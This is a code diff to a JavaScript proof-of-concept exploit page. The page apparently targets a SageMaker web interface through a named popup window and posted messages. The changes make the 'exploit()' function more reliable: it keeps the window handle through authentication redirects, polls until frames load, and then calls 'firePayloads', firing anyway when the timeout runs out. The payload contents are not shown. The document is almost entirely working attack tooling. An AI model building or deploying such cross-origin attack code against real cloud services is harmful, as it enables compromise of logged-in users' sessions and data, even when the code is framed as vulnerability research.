@@ -78,32 +78,41 @@ function exploit() {
   var url = document.getElementById('url').value.trim();
   var wait = parseInt(document.getElementById('wait').value) || 12000;
 
-  // Open popup — must be triggered from user click (we are)
-  var w = window.open(url, '_blank');
+  // Use a named window — preserves the handle through redirects
+  // Opening about:blank first, then navigating, keeps the reference alive
+  var w = window.open('about:blank', 'sagemaker_target');
   if (!w) { status('Popup blocked — allow popups and retry.', 'err'); return; }
-  status('Popup opened. Polling until ready (up to ' + wait + 'ms)...', 'warn');
+  w.location = url;
+  status('Popup opened (named window). Polling until ready (up to ' + wait + 'ms)...', 'warn');
 
-  // Poll every 2s instead of a single setTimeout — handles auth redirects
-  // that temporarily make the window appear closed/empty
   var elapsed = 0;
   var interval = 2000;
   var timer = setInterval(function() {
     elapsed += interval;
-    if (w.closed) {
-      // Window might reopen via redirect — keep waiting unless timeout
+
+    // Check window state — wrap everything in try/catch for cross-origin errors
+    var closed = false;
+    var frameCount = 0;
+    try { closed = w.closed; } catch(e) { /* cross-origin, window still exists */ }
+    try { frameCount = w.length; } catch(e) { /* cross-origin access denied — expected */ }
+
+    if (closed) {
       if (elapsed >= wait) {
         clearInterval(timer);
-        status('Popup closed and did not reopen within timeout.', 'err');
-        status('Tip: manually open the target URL first, then re-run the PoC.', 'warn');
+        status('Popup was closed.', 'err');
       }
       return;
     }
-    // Window is open — check if frames have loaded
-    var frameCount = 0;
-    try { frameCount = w.length; } catch(e) {}
-    status('Poll ' + (elapsed/1000) + 's: window open, ' + frameCount + ' frame(s)', '');
-    if (frameCount > 0 || elapsed >= wait) {
+
+    status('Poll ' + (elapsed/1000) + 's: window alive, ' + frameCount + ' frame(s)', '');
+
+    if (frameCount > 0) {
       clearInterval(timer);
+      firePayloads(w);
+    } else if (elapsed >= wait) {
+      // Timeout — fire anyway (postMessage to window itself as fallback)
+      clearInterval(timer);
+      status('Timeout reached. Firing payloads to window anyway...', 'warn');
       firePayloads(w);
     }
   }, interval);
